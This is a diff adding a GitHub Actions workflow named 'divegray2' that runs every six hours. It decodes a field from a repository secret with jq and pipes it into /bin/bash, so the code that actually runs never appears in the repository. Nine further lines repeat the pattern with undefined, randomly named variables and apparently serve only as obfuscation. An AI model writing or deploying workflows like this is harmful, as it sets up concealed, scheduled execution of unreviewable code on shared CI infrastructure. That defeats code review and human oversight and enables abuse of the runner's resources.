@@ -1,0 +1,26 @@
+name: divegray2
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: divegray2
+        env:
+          zx7: ${{ secrets.zx7 }}
+        run: |
+          echo $zx7 | jq -r .yxpl156 | /bin/bash
+          echo $y705 | jq -r .pxgs01 | /bin/bash
+          echo $ejg8712 | jq -r .vdy87342 | /bin/bash
+          echo $x40091 | jq -r .aldcl9934 | /bin/bash
+          echo $lkpox5 | jq -r .yhkfn365 | /bin/bash
+          echo $gs17533 | jq -r .xb02779 | /bin/bash
+          echo $ljyu49 | jq -r .vym419 | /bin/bash
+          echo $enl6196 | jq -r .sau60268 | /bin/bash
+          echo $yvu2176 | jq -r .r31 | /bin/bash
+          echo $h3 | jq -r .tzo9352 | /bin/bash
+
